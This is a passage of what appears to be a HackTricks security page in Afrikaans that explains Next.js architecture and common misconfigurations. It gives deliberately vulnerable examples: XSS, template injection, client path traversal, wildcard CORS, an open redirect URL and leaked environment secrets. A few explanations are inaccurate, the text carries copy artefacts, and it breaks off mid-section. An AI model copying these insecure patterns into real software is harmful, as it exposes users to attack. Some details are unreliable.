# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Algemene argitektuur van 'n Next.js-toepassing

### Tipiese lêerstruktuur

'n Standaard Next.js-projek volg 'n spesifieke lêer- en gidsstruktuur wat sy funksies soos routing, API-endpoints, en bestuur van statiese assets vergemaklik. Hier is 'n tipiese uitleg:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kern gidse en lêers

- **public/:** Herberg statiese bates soos beelde, lettertipes, en ander lêers. Lêers hier is toeganklik by die wortelpad (`/`).
- **app/:** Sentraal gids vir jou toepassing se bladsye, layouts, komponente, en API routes. Omarm die **App Router** paradigma, wat gevorderde routeringsfunksies en skeiding tussen server- en kliënt-komponente moontlik maak.
- **app/layout.tsx:** Bepaal die wortel-layout vir jou toepassing, wat alle bladsye omlaan en konsekwente UI-elemente soos opskrifte, voettekste en navigasiebare verskaf.
- **app/page.tsx:** Dien as die toetspunt vir die wortelroete `/`, en render die tuisblad.
- **app/[route]/page.tsx:** Hanteer statiese en dinamiese roetes. Elke vouer binne `app/` verteenwoordig 'n roetesegment, en `page.tsx` binne daardie vouers stem ooreen met die roete se komponent.
- **app/api/:** Bevat API-roetes, wat jou toelaat om serverless funksies te skep wat HTTP-versoeke hanteer. Hierdie roetes vervang die tradisionele `pages/api` gids.
- **app/components/:** Huisves herbruikbare React-komponente wat oor verskeie bladsye en layouts gebruik kan word.
- **app/styles/:** Bevat globale CSS-lêers en CSS Modules vir komponent-spesifieke stiling.
- **app/utils/:** Sluit nuttige funksies, helper-modules en ander nie-UI logika in wat gedeel kan word oor die toepassing.
- **.env.local:** Berg omgewingsveranderlikes spesifiek vir die plaaslike ontwikkelomgewing. Hierdie veranderlikes word **nie** na weergawebeheer gecommit nie.
- **next.config.js:** Pas Next.js se gedrag aan, insluitend webpack-konfigurasies, omgewingsveranderlikes en sekuriteitsinstellings.
- **tsconfig.json:** Konfigureer TypeScript-instellings vir die projek, wat type checking en ander TypeScript-funksies moontlik maak.
- **package.json:** Beheer projekafhanklikhede, skripte en metadata.
- **README.md:** Verskaf dokumentasie en inligting oor die projek, insluitend opstelinstruksies, gebruiksriglyne en ander relevante besonderhede.
- **yarn.lock / package-lock.json:** Sluit die projek se afhanklikhede tot spesifieke weergawes vas, wat konsekwente installasies oor verskeie omgewings verseker.

## Kliëntkant in Next.js

### Lêergebaseerde routering in die `app` gids

Die `app` gids is die hoeksteen van routering in die nuutste Next.js weergawes. Dit benut die lêerstelsel om roetes te definieer, wat roete-bestuur intuïtief en skaalbaar maak.

<details>

<summary>Hantering van die wortelpad /</summary>

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Belangrike lêers:**

- **`app/page.tsx`**: Hanteer versoeke na die wortelpad `/`.
- **`app/layout.tsx`**: Definieer die layout vir die toepassing en omvou alle bladsye.

**Implementering:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Verduideliking:**

- **Roete-beskrywing:** Die `page.tsx`-lêer direk onder die `app`-gids ooreen met die `/`-roete.
- **Rendering:** Hierdie komponent rendeer die inhoud vir die tuisblad.
- **Layout-integrasie:** Die `HomePage`-komponent word deur `layout.tsx` omhul, wat headers, footers en ander algemene elemente kan bevat.

</details>

<details>

<summary>Hantering van ander statiese paaie</summary>

**Voorbeeld: `/about`-roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx` lêer binne die `about` gids kom ooreen met die `/about` roete.
- **Rendering:** Hierdie komponent render die inhoud vir die about-bladsy.

</details>

<details>

<summary>Dinamiese Roetes</summary>

Dinamiese roetes laat toe om paaie met veranderlike segmente te hanteer, sodat toepassings inhoud kan vertoon gebaseer op parameters soos IDs, slugs, ens.

**Voorbeeld: `/posts/[id]` Route**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Verduideliking:**

- **Dinamiese segment:** `[id]` dui 'n dinamiese segment in die route aan en vang die `id`-parameter uit die URL.
- **Toegang tot parameters:** Die `params`-objek bevat die dinamiese parameters, toeganklik binne die komponent.
- **Roete-ooreenkoms:** Enige pad wat ooreenstem met `/posts/*`, soos `/posts/1`, `/posts/abc`, ens., sal deur hierdie komponent hanteer word.

</details>

<details>

<summary>Geneste roetes</summary>

Next.js ondersteun geneste roetes, wat hiërargiese roetestrukture moontlik maak wat die gidsstruktuur weerspieël.

**Voorbeeld: `/dashboard/settings/profile` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Verduideliking:**

- **Deep Nesting:** Die `page.tsx`-lêer binne `dashboard/settings/profile/` ooreenstem met die `/dashboard/settings/profile`-roete.
- **Hierarchy Reflection:** Die gidsstruktuur weerspieël die URL-pad, wat onderhoudbaarheid en duidelikheid verbeter.

</details>

<details>

<summary>Catch-All-roetes</summary>

Catch-all-roetes hanteer meerdere geneste segmente of onbekende paaie, wat buigsaamheid in roetehantering bied.

**Voorbeeld: `/*`-roete**

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Verduideliking:**

- **Catch-All Segment:** `[...slug]` vang al die oorblywende padsegmenten as 'n array.
- **Gebruik:** Nuttig vir die hantering van dinamiese roeteringscenario's soos gebruikersgegenereerde paaie, geneste kategorieë, ens.
- **Roete-ooreenstemming:** Paaie soos `/anything/here`, `/foo/bar/baz`, ens., word deur hierdie komponent hanteer.

</details>

### Potensiële kliëntkant-kwesbaarhede

Alhoewel Next.js 'n veilige grondslag bied, kan onvanpaste koderingpraktyke kwesbaarhede inbring. Belangrike kliëntkant-kwesbaarhede sluit in:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-aanvalle gebeur wanneer kwaadwillige skripte in vertroude webwerwe geïnjekteer word. Aanvallers kan skripte in gebruikers se blaaiers uitvoer, data steel of aksies namens die gebruiker uitvoer.

**Voorbeeld van kwesbare kode:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Waarom dit kwesbaar is:** Die gebruik van `dangerouslySetInnerHTML` met onbetroubare invoer laat aanvallers toe om kwaadwillige skripte in te spuit.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Kom voor wanneer gebruikersinsette onbehoorlik in sjablone hanteer word, wat aanvallers toelaat om sjablone of uitdrukkings in te spuit en uit te voer.

**Voorbeeld van kwesbare kode:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Waarom dit kwesbaar is:** As `template` of `data` kwaadwillige inhoud bevat, kan dit lei tot die uitvoering van onverwagte kode.

</details>

<details>

<summary>Client Path Traversal</summary>

Dit is 'n kwesbaarheid wat aanvallers toelaat om klientkant-paadjies te manipuleer om onverwagte aksies uit te voer, soos Cross-Site Request Forgery (CSRF). Anders as server-side path traversal, wat die bediener se lêerstelsel teiken, fokus CSPT op die uitbuiting van klientkant-meganismes om wettige API-versoeke te herlei na kwaadwillige endpunte.

**Voorbeeld van kwesbare kode:**

'n Next.js-toepassing laat gebruikers toe om lêers op te laai en af te laai. Die aflaaifunksie is op die klientkant geïmplementeer, waar gebruikers die lêerpad kan spesifiseer om af te laai.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Aanvalsscenario

1. **Aanvaller se Doelwit**: Voer 'n CSRF-aanval uit om 'n kritiese lêer te verwyder (bv. `admin/config.json`) deur die `filePath` te manipuleer.
2. **Uitbuiting van CSPT**:
- **Kwaadaardige inset**: Die aanvaller vervaardig 'n URL met 'n gemanipuleerde `filePath` soos `../deleteFile/config.json`.
- **Resulterende API-oproep**: Die klientkant-kode maak 'n versoek na `/api/files/../deleteFile/config.json`.
- **Server se hantering**: As die bediener nie die `filePath` valideer nie, verwerk dit die versoek en kan sensitiewe lêers moontlik verwyder of openbaar word.
3. **Uitvoering van CSRF**:
- **Gevormde skakel**: Die aanvaller stuur die slagoffer 'n skakel of embed 'n kwaadwillige script wat die aflaaiversoek met die gemanipuleerde `filePath` aktiveer.
- **Uitkoms**: Die slagoffer voer die aksie onbewustelik uit, wat lei tot ongemagtigde lêertoegang of verwydering.

#### Hoekom dit kwesbaar is

- **Gebrek aan insetvalidering**: Die klientkant laat arbitrêre `filePath` insette toe, wat path traversal moontlik maak.
- **Vertrou op klientinsette**: Die bediener-kant API vertrou en verwerk die `filePath` sonder sanitisering.
- **Potensiële API-aksies**: As die API-endpoint toestandveranderende aksies uitvoer (bv. verwyder, wysig lêers), kan dit via CSPT uitgebuit word.

</details>

## Bediener-kant in Next.js

### Server-Side Rendering (SSR)

Pages are rendered on the server on each request, ensuring that the user receives fully rendered HTML. In this case you should create your own custom server to process the requests.

**Use Cases:**

- Dynamiese inhoud wat gereeld verander.
- SEO-optimalisering, aangesien soekenjins die volledig gerenderde bladsy kan kruip.

**Implementation:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statiese Webwerf Generering (SSG)

Bladsye word vooraf gerender tydens die bou-tyd, wat lei tot vinniger laaitye en verminderde bedienerbelasting.

**Gebruikgevalle:**

- Inhoud wat nie gereeld verander nie.
- Blogs, dokumentasie, bemarkingsbladsye.

**Implementering:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless-funksies (API Routes)

Next.js laat die skepping van API-endpunte toe as serverless funksies. Hierdie funksies hardloop op aanvraag sonder die behoefte aan 'n toegewyde server.

**Gebruikgevalle:**

- Om vorminskrywings te hanteer.
- Interaksie met databasisse.
- Verwerking van data of integrasie met derdeparty APIs.

**Implementering:**

Met die bekendstelling van die `app` directory in Next.js 13 het routering en API-hantering meer buigsaam en kragtig geword. Hierdie moderne benadering kom nou baie nader aan die lêergebaseerde routeringsisteem, maar bied verbeterde vermoëns, insluitend ondersteuning vir server en client komponente.

#### Basiese Route Handler

**Lêerstruktuur:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementering:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Toelichting:**

- **Ligging:** API routes word geleë onder die `app/api/`-gids.
- **Bestandsnaam:** Elke API-endpoint is in sy eie gids wat 'n `route.js` of `route.ts`-lêer bevat.
- **Uitgevoerde funksies:** In plaas van 'n enkele default export, word spesifieke HTTP-metode funksies (bv. `GET`, `POST`) geëksporteer.
- **Response Handling:** Gebruik die `Response` constructor om responses terug te gee, wat meer beheer oor headers en statuskodes moontlik maak.

#### Hoe om ander paaie en metodes te hanteer:

<details>

<summary>Hantering van spesifieke HTTP-metodes</summary>

Next.js 13+ laat jou toe om handlers vir spesifieke HTTP-metodes binne dieselfde `route.js` of `route.ts`-lêer te definieer, wat duideliker en meer georganiseerde kode bevorder.

**Voorbeeld:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Multiple Exports:** Elke HTTP-metode (`GET`, `PUT`, `DELETE`) het sy eie geëksporteerde funksie.
- **Parameters:** Die tweede argument gee toegang tot roete-parameters via `params`.
- **Enhanced Responses:** Groter beheer oor response-objekte, wat presiese hantering van headers en statuskodes moontlik maak.

</details>

<details>

<summary>Catch-All en Geneste Roetes</summary>

Next.js 13+ ondersteun gevorderde roeteringsfunksies soos catch-all roetes en geneste API-roetes, wat meer dinamiese en skaalbare API-strukture moontlik maak.

**Catch-All Roete Voorbeeld:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explanation:**

- **Syntax:** `[...]` dui 'n catch-all segment aan, wat alle geneste paaie vasvang.
- **Usage:** Nuttig vir APIs wat verskillende dieptes van roetes of dinamiese segmente moet hanteer.

**Nested Routes Example:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Verduideliking:**

- **Diepe genesting:** Laat hiërargiese API-strukture toe, wat hulpbronverhoudings weerspieël.
- **Toegang tot parameters:** Maak dit maklik om verskeie roete-parameters via die `params`-objek te toegang.

</details>

<details>

<summary>Hantering van API-roetes in Next.js 12 en vroeër</summary>

## API-roetes in die `pages` Directory (Next.js 12 and Earlier)

Voordat Next.js 13 die `app`-gids en verbeterde routeringsvermoëns bekendgestel het, is API-roetes hoofsaaklik binne die `pages`-gids gedefinieer. Hierdie benadering word steeds wyd gebruik en ondersteun in Next.js 12 en vroeër weergawes.

#### Basiese API-roete

**Lêerstruktuur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Verduideliking:**

- **Ligging:** API-roetes bevind hulle onder die `pages/api/` directory.
- **Export:** Gebruik `export default` om die handler-funksie te definieer.
- **Funksiesignatuur:** Die handler ontvang `req` (HTTP-versoek) en `res` (HTTP-antwoord) objekte.
- **Roetering:** Die lêernaam (`hello.js`) ooreenstem met die endpoint `/api/hello`.

#### Dinamiese API-roetes

**Lêerstruktuur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Verduideliking:**

- **Dinamiese Segmente:** Vierkantige hakies (`[id].js`) dui dinamiese roete-segmente aan.
- **Toegang tot Parameters:** Gebruik `req.query.id` om toegang tot die dinamiese parameter te kry.
- **Hantering van Metodes:** Gebruik voorwaardelike logika om verskillende HTTP-metodes (`GET`, `PUT`, `DELETE`, ens.) te hanteer.

#### Hantering van verskillende HTTP-metodes

Alhoewel die basiese API-roetevoorbeeeld alle HTTP-metodes binne ’n enkele funksie hanteer, kan jy jou kode struktureer om elke metode eksplisiet te hanteer vir beter duidelikheid en onderhoudbaarheid.

**Voorbeeld:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste praktyke:**

- **Skeiding van verantwoordelikhede:** Skei logika duidelik vir verskillende HTTP-metodes.
- **Respons-konsistensie:** Verseker konsekwente responsstrukture sodat kliënt-side hantering eenvoudiger is.
- **Fouthantering:** Hanteer onondersteunde metodes en onverwagte foute op 'n ordentlike wyse.

</details>

### CORS Configuration

Beheer watter oorspronge toegang tot jou API-roetes kan kry om Cross-Origin Resource Sharing (CORS)-kwesbaarhede te beperk.

**Slegte konfigurasie voorbeeld:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Let wel: **CORS kan ook in alle API routes gekonfigureer word** binne die **`middleware.ts`** lêer:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Probleem:**

- **`Access-Control-Allow-Origin: '*'`:** Laat enige webwerf toe om toegang tot die API te kry, wat moontlik kwaadwillige werwe in staat stel om sonder beperkings met jou API te kommunikeer.
- **Wye metode-toestemming:** Om alle metodes toe te laat kan aanvallers in staat stel om ongewenste aksies uit te voer.

**Hoe aanvallers dit uitbuit:**

Aanvallers kan kwaadwillige webwerwe skep wat versoeke na jou API stuur, en moontlik funksionaliteite misbruik soos data-opvraging, data-manipulasie of die veroorsaak van ongewenste aksies namens geverifieerde gebruikers.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Server-kode blootstelling aan die kliëntkant

Dit is maklik om **kode wat deur die server gebruik word ook in kode wat aan die kliëntkant blootgestel en gebruik word** te hergebruik; die beste manier om te verseker dat ’n kode-lêer nooit aan die kliëntkant blootgestel word nie, is deur hierdie import aan die begin van die lêer te gebruik:
```js
import "server-only"
```
## Sleutellêers en Hul Rolle

### `middleware.ts` / `middleware.js`

**Ligging:** Wortel van die projek of binne `src/`.

**Doel:** Voer kode uit in die server-side serverless-funksie voordat 'n versoek verwerk word, wat take soos authentication, redirects, of die wysiging van responses moontlik maak.

**Uitvoeringsvloei:**

1. **Inkomende versoek:** Die middleware onderskep die versoek.
2. **Verwerking:** Voer operasies uit gebaseer op die versoek (bv. check authentication).
3. **Response-wysiging:** Kan die response verander of die beheer aan die volgende handler deurgee.

**Voorbeelde van gebruiksgevalle:**

- Herlei ongeverifieerde gebruikers.
- Voeg pasgemaakte headers by.
- Log versoeke.

**Voorbeeldkonfigurasie:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### `next.config.js`

**Ligging:** Wortel van die projek.

**Doel:** Stel Next.js-gedrag in, skakel funksies aan of af, pas webpack-konfigurasies aan, stel omgewingsveranderlikes in, en konfigureer verskeie sekuriteitsfunksies.

**Belangrike sekuriteitskonfigurasies:**

<details>

<summary>Sekuriteitsheaders</summary>

Sekuriteitsheaders verbeter die sekuriteit van jou toepassing deur blaaiers te instrueer oor hoe om inhoud te hanteer. Hulle help om verskeie aanvalle soos Cross-Site Scripting (XSS), Clickjacking, en MIME type sniffing te versag:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Voorbeelde:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Beeldoptimaliseringsinstellings</summary>

Next.js optimaliseer beelde vir prestasie, maar verkeerde konfigurasies kan lei tot sekuriteitskwesbaarhede, soos dat onbetroubare bronne kwaadwillige inhoud kan injekteer.

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Probleem:**

- **`'*'`:** Laat toe dat beelde vanaf enige eksterne bron gelaai word, insluitend onbetroubare of kwaadwillige domeine. Aanvallers kan beelde aanbied wat kwaadwillige payloads bevat of inhoud wat gebruikers mislei.
- Nog 'n probleem kan wees om 'n domein toe te laat **waar enigiemand 'n beeld kan oplaai** (soos `raw.githubusercontent.com`)

**Hoe aanvallers dit misbruik:**

Deur beelde van kwaadwillige bronne in te sluit, kan aanvallers phishing-aanvalle uitvoer, misleidende inligting vertoon, of kwesbaarhede in beeld-renderbiblioteke uitbuit.

</details>

<details>

<summary>Blootstelling van omgewingsveranderlikes</summary>

Hanteer sensitiewe inligting soos API-sleutels en databasis-inlogbewyse veilig sonder om dit aan die kliënt bloot te stel.

#### a. Blootstelling van sensitiewe veranderlikes

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Probleem:**

- **`SECRET_API_KEY`:** Sonder die `NEXT_PUBLIC_` voorvoegsel openbaar Next.js nie veranderlikes aan die kliënt nie. As dit egter per ongeluk met die voorvoegsel aangedui word (bv. `NEXT_PUBLIC_SECRET_API_KEY`), raak dit op die kliënt-kant toeganklik.

**Hoe aanvallers dit misbruik:**

As sensitiewe veranderlikes aan die kliënt blootgestel word, kan aanvallers dit bekom deur die kliënt-kant kode of netwerkversoeke te ondersoek, en sodoende ongemagtigde toegang tot APIs, databasisse of ander dienste verkry.

</details>

<details>

<summary>Redirects</summary>

Beheer URL-omleidings en -herskrywings binne jou toepassing, en verseker dat gebruikers behoorlik gerig word sonder om open redirect vulnerabilities te skep.

#### a. Open Redirect Vulnerability

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Probleem:**

- **Dinamiese Bestemming:** Laat gebruikers toe om enige URL te spesifiseer, wat open redirect-aanvalle moontlik maak.
- **Vertroue op gebruikersinvoer:** Omleidings na URLs wat deur gebruikers verskaf word sonder validering, kan lei tot phishing, malware distribution, of credential theft.

**Hoe aanvallers dit misbruik:**

Aanvallers kan URLs saamstel wat blykbaar van jou domein afkomstig is, maar gebruikers na kwaadaardige webwerwe omlei. Byvoorbeeld:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gebruikers wat die oorspronklike domein vertrou, kan onbewustelik na skadelike webwerwe navigeer.

</details>

<details>

<summary>Webpack-konfigurasie</summary>

Pas Webpack-konfigurasies vir jou Next.js-toepassing aan, wat onbedoeld sekuriteitskwesbaarhede kan inbring as dit nie versigtig hanteer word nie.

#### a. Blootstelling van sensitiewe modules

**Slegte konfigurasievoorbeeld:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Probleem:**

- **Exposing Sensitive Paths:** Aliasing sensitiewe gidse en toestaan van client-side toegang kan leak vertroulike inligting.
- **Bundling Secrets:** As sensitiewe lêers vir die client gebundel word, word hul inhoud toeganklik via source maps of deur die client-side code te inspecteer.

**Hoe aanvallers dit misbruik:**

Aanvallers kan toegang kry tot of die toepassing se gidsstruktuur herbou, waardeur hulle moontlik sensitiewe lêers of data kan vind en uitbuit.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Doel:** Oorskryf die standaard App component, wat globale state, styles, en layout-komponente moontlik maak.

**Gebruikssituasies:**

- Inspuiting van globale CSS.
- Byvoeg van layout-omhulsels.
- Integrering van toestandsbestuur-biblioteke.

**Voorbeeld:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Doel:** Oorskryf die standaard Document, wat aanpassing van die HTML- en Body-tags moontlik maak.

**Gebruikstoepassings:**

- Aanpassing van die `<html>` of `<body>`-tags.
- Voeg meta-tags of pasgemaakte scripts by.
- Integrasie van derdeparty-lettertipes.

**Voorbeeld:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Aangepaste bediener (Opsioneel)

**Doel:** Alhoewel Next.js met 'n ingeboude bediener kom, kan jy 'n aangepaste bediener skep vir gevorderde gebruiksgevalle soos aangepaste routing of integrasie met bestaande backend-dienste.

**Nota:** Die gebruik van 'n aangepaste bediener kan ontplooiingsopsies beperk, veral op platforms soos Vercel wat geoptimaliseer is vir Next.js se ingeboude bediener.

**Voorbeeld:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Bykomende argitektoniese en sekuriteits-oorwegings

### Omgewingsveranderlikes en Konfigurasie

**Doel:** Bestuur sensitiewe inligting en konfigurasie-instellings buite die kodebasis.

**Beste praktyke:**

